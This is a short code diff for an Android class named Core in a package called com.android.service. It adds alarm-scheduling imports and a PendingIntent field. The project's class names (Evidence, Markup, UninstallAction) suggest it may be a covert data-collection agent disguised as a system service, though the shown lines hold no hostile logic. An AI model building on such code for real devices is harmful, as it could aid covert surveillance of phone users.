@@ -8,20 +8,22 @@
 package com.android.service;
 
 import android.app.Activity;
+import android.app.AlarmManager;
+import android.app.PendingIntent;
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.Intent;
 import android.content.res.Resources;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
+import android.os.SystemClock;
 
-import com.android.service.Core.CheckAction;
 import com.android.service.action.Action;
 import com.android.service.action.SubAction;
 import com.android.service.action.UninstallAction;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfType;
 import com.android.service.conf.Configuration;
-import com.android.service.event.BaseEvent;
 import com.android.service.evidence.Evidence;
 import com.android.service.evidence.Markup;
 import com.android.service.file.AutoFile;
@@ -62,6 +64,7 @@ public class Core extends Activity implements Runnable {
 	// private long queueSemaphore;
 	private Thread fastQueueThread;
 	private CheckAction checkActionFast;
+	private PendingIntent alarmIntent = null;
 	
 	/**
 	 * Start.
